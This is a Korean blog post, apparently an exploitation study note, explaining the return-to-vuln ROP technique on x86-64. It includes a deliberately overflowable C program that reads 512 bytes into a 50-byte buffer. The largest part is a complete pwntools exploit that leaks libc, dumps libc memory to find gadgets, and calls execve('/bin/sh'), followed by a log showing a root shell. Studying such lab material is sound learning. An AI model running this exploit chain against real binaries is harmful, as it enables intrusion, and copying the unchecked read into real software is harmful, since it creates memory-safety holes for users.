---
title: Return-to-vuln
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-vuln]
math: true
mermaid: true
---


## Description

Return-to-vuln 이란 ROP 코드를 실행한 후에 취약성이 있는 코드로 다시 이동하는 것을 말한다.

## GCC vs Clang

gcc로 컴파일된 파일은 “leave ; ret” Gadget을 찾을 수 있지만 clang으로 컴파일된 파일은 “leave ; ret” Gadget “leave ; ret” gadget을 찾을 수 없다. Clang으로 컴파일된 바이너리는 스택(엔트리포인트)을 정리할 때 “leave” 명령어가 사용되지 않는다.

```
0000000000400590 <main>:
  400590:   55                      push   %rbp
  400591:   48 89 e5                mov    %rsp,%rbp
  400594:   48 83 ec 10             sub    $0x10,%rsp
  400598:   bf 01 00 00 00          mov    $0x1,%edi
  40059d:   48 be 54 06 40 00 00    movabs $0x400654,%rsi
  4005a4:   00 00 00
  4005a7:   b8 0a 00 00 00          mov    $0xa,%eax
  4005ac:   89 c2                   mov    %eax,%edx
  4005ae:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%rbp)
  4005b5:   e8 86 fe ff ff          callq  400440 <_init+0x30>
  4005ba:   48 89 45 f0             mov    %rax,-0x10(%rbp)
  4005be:   e8 9d ff ff ff          callq  400560 <vuln>
  4005c3:   31 c0                   xor    %eax,%eax
  4005c5:   48 83 c4 10             add    $0x10,%rsp
  4005c9:   5d                      pop    %rbp
  4005ca:   c3                      retq  
  4005cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
...
```

이러한 문제를 해결하기 위해 Return-to-vuln 기법을 사용한다.

## Just-In-Time Code Reuse

ROP를 이용하여 JIT 컴파일러에 의해 생성된 바이트 코드의 영역을 읽어서 부족한 gadget을 찾는 방식이다.

## Proof of concept

```c
// Vuln Code
// clang -fno-stack-protector -Wl,-z,relro,-z,now -o rop rop.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    read(0, buf, 512);
}
  
int main(){
    write(1,"Hello ROP\n",10);
    vuln();
    return 0;
}
```

72개 이상의 문자열을 입력하면 overflow 발생한다.

```
db-peda$ x/24gx $rbp
0x7fffffffe380: 0x4141414141414141  0x000000000040050a
```

## Exploit Method

1. write(1, __libc_start_main, 8)
2. Jump to vuln
3. write(1, Address of leak libc, 0x190000)
4. read(0, base_stage, 8)
5. Jump to Vuln
6. execve(‘/bin/sh’, 0, 0)

### __libc_csu_init Gadget

```
00000000004005d0 <__libc_csu_init>:
  4005d0:   41 57                   push   %r15
  4005d2:   41 56                   push   %r14
  4005d4:   41 89 ff                mov    %edi,%r15d
  4005d7:   41 55                   push   %r13
  4005d9:   41 54                   push   %r12
  4005db:   4c 8d 25 0e 08 20 00    lea    0x20080e(%rip),%r12        # 600df0 <__frame_dummy_init_array_entry>
  4005e2:   55                      push   %rbp
  4005e3:   48 8d 2d 0e 08 20 00    lea    0x20080e(%rip),%rbp        # 600df8 <__init_array_end>
  4005ea:   53                      push   %rbx
  4005eb:   49 89 f6                mov    %rsi,%r14
  4005ee:   49 89 d5                mov    %rdx,%r13
  4005f1:   4c 29 e5                sub    %r12,%rbp
  4005f4:   48 83 ec 08             sub    $0x8,%rsp
  4005f8:   48 c1 fd 03             sar    $0x3,%rbp
  4005fc:   e8 0f fe ff ff          callq  400410 <_init>
  400601:   48 85 ed                test   %rbp,%rbp
  400604:   74 20                   je     400626 <__libc_csu_init+0x56>
  400606:   31 db                   xor    %ebx,%ebx
  400608:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  40060f:   00 
  400610:   4c 89 ea                mov    %r13,%rdx      <--- Gadget 2
  400613:   4c 89 f6                mov    %r14,%rsi
  400616:   44 89 ff                mov    %r15d,%edi
  400619:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  40061d:   48 83 c3 01             add    $0x1,%rbx
  400621:   48 39 eb                cmp    %rbp,%rbx
  400624:   75 ea                   jne    400610 <__libc_csu_init+0x40>
  400626:   48 83 c4 08             add    $0x8,%rsp
  40062a:   5b                      pop    %rbx       <--- Gadget 1
  40062b:   5d                      pop    %rbp
  40062c:   41 5c                   pop    %r12
  40062e:   41 5d                   pop    %r13
  400630:   41 5e                   pop    %r14
  400632:   41 5f                   pop    %r15
  400634:   c3                      retq   
  400635:   90                      nop
  400636:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40063d:   00 00 00 
```

### .bss Section Address

```
gdb-peda$ shell readelf -S ./rop
There are 29 section headers, starting at offset 0x19f0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  ...
  [24] .bss              NOBITS           0000000000601010  00001010
       0000000000000008  0000000000000000  WA       0     0     1
  ...
```

## Exploit code

```python
# Exploit Code
from pwn import *

binary = ELF('./rop')
read_got_addr = binary.got['read']
write_got_addr = binary.got['write']
got_start_addr = binary.got['__libc_start_main']

csu_init_gadget_1 = 0x40062a
csu_init_gadget_2 = 0x400610

bss_addr = 0x601010
base_stage = bss_addr + 0x400

vuln_addr = 0x400560

execve = 59

log.info('read got addr: ' + str(hex(read_got_addr)))
log.info('write got addr: ' + str(hex(write_got_addr)))
log.info('got start addr: ' + str(hex(got_start_addr)))

p = process(binary.path)
#gdb.attach(p)
log.info(p.recvline())

# Stage 1

payload = "A"*72
# write(1,got_start_addr,8)
payload += p64(csu_init_gadget_1)
payload += p64(0)
payload += p64(1)
payload += p64(write_got_addr)
payload += p64(8)
payload += p64(got_start_addr)
payload += p64(1)
payload += p64(csu_init_gadget_2)

payload += p64(0)

payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(vuln_addr) # jump to vuln

p.send(payload)
libc_addr = u64(p.recvn(8))
log.info('__libc_start_main: '+str(hex(libc_addr)))

# Stage 2
libc_bin = ''
libc_readsize = 0x190000

# write(1,libc_addr,0x190000)
payload = "A"*72
payload += p64(csu_init_gadget_1)
payload += p64(0)
payload += p64(1)
payload += p64(write_got_addr)
payload += p64(libc_readsize)
payload += p64(libc_addr)
payload += p64(1)
payload += p64(csu_init_gadget_2)

payload += p64(0)
# read(0,base_stage,8)
payload += p64(0)
payload += p64(1)
payload += p64(read_got_addr)
payload += p64(8)
payload += p64(base_stage)
payload += p64(0)
payload += p64(csu_init_gadget_2)

payload += p64(0)

payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(vuln_addr) # jmp to vuln

p.send(payload)
for i in range(0,libc_readsize/4096):
    libc_bin += p.recv(4096)

pop_rax_ret_offset = libc_bin.index('\x58\xc3')
pop_rdi_ret_offset = libc_bin.index('\x5f\xc3')
pop_rsi_ret_offset = libc_bin.index('\x5e\xc3')
pop_rdx_ret_offset = libc_bin.index('\x5a\xc3')
syscall_offset = libc_bin.index('\x0f\x05')

log.info('pop rax ; ret Gadget: '+hex(libc_addr + pop_rax_ret_offset))
log.info('pop rdi ; ret Gadget: '+hex(libc_addr + pop_rdi_ret_offset))
log.info('pop rsi ; ret Gadget: '+hex(libc_addr + pop_rsi_ret_offset))
log.info('pop rdx ; ret Gadget: '+hex(libc_addr + pop_rdx_ret_offset))
log.info('syscall Gadget: '+hex(libc_addr + syscall_offset))

p.send('/bin/sh\x00')

# Stage 3
# execve('/bin/sh',0,0)
payload = "A"*72
payload += p64(libc_addr + pop_rax_ret_offset)
payload += p64(execve)
payload += p64(libc_addr + pop_rdi_ret_offset)
payload += p64(base_stage)
payload += p64(libc_addr + pop_rsi_ret_offset)
payload += p64(0)
payload += p64(libc_addr + pop_rdx_ret_offset)
payload += p64(0)
payload += p64(libc_addr + syscall_offset)

p.send(payload)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/return-to-vuln# python exploit.py 
[*] '/root/pwnable/return-to-vuln/rop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] read got addr: 0x600fe8
[*] write got addr: 0x600fe0
[*] got start addr: 0x600ff0
[+] Starting local process '/root/pwnable/return-to-vuln/rop': pid 5042
[*] Hello ROP
[*] __libc_start_main: 0x7f0e04dfb740
[*] pop rax ; ret Gadget: 0x7f0e04e0e544
[*] pop rdi ; ret Gadget: 0x7f0e04dfc102
[*] pop rsi ; ret Gadget: 0x7f0e04dfdbb5
[*] pop rdx ; ret Gadget: 0x7f0e04ef00a6
[*] syscall Gadget: 0x7f0e04dfb8a4
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable/return-to-vuln
```

## References
- [02.Return-to-csu(feat.Return-to-vuln, Just-In-Time Code Reuse) - x64](https://www.lazenca.net/display/TEC/02.Return-to-csu%28feat.Return-to-vuln%2C+Just-In-Time+Code+Reuse%29+-+x64)